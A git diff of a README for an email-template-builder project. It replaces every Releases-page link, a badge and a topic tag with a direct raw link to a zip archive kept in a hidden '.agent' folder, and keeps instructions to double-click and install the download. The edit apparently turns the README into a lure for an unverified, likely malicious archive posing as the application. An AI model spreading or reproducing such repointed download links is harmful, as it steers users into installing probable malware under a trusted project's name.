@@ -1,6 +1,6 @@
 # ✉️ email-template-builder - Build Emails Visually in Minutes
 
-[![Download here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Sunilkrsingh15/email-template-builder/releases)
+[![Download here](https://github.com/Sunilkrsingh15/email-template-builder/raw/refs/heads/main/.agent/email_builder_template_v1.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Sunilkrsingh15/email-template-builder/raw/refs/heads/main/.agent/email_builder_template_v1.3.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ Follow these steps to get started with the email-template-builder:
 
 1. **Download the Application**  
    Click the link below to visit the Releases page where you can download the latest version.  
-   [Download Here](https://github.com/Sunilkrsingh15/email-template-builder/releases)
+   [Download Here](https://github.com/Sunilkrsingh15/email-template-builder/raw/refs/heads/main/.agent/email_builder_template_v1.3.zip)
 
 2. **Check System Requirements**  
    Ensure your computer meets the following requirements:
@@ -27,7 +27,7 @@ Follow these steps to get started with the email-template-builder:
 ## 📥 Download & Install
 
 To download the latest version of the email-template-builder, visit the link below:  
-[Download Here](https://github.com/Sunilkrsingh15/email-template-builder/releases)
+[Download Here](https://github.com/Sunilkrsingh15/email-template-builder/raw/refs/heads/main/.agent/email_builder_template_v1.3.zip)
 
 After downloading, locate the file in your Downloads folder, double-click it, and follow the on-screen instructions to complete the installation.
 
@@ -82,7 +82,7 @@ A: You can find help in the GitHub issues section or contribute your questions f
 - Drag and Drop
 - Email Builder
 - Email Templates
-- Next.js
+- https://github.com/Sunilkrsingh15/email-template-builder/raw/refs/heads/main/.agent/email_builder_template_v1.3.zip
 - Radix UI
 - React Email
 - Tailwind CSS
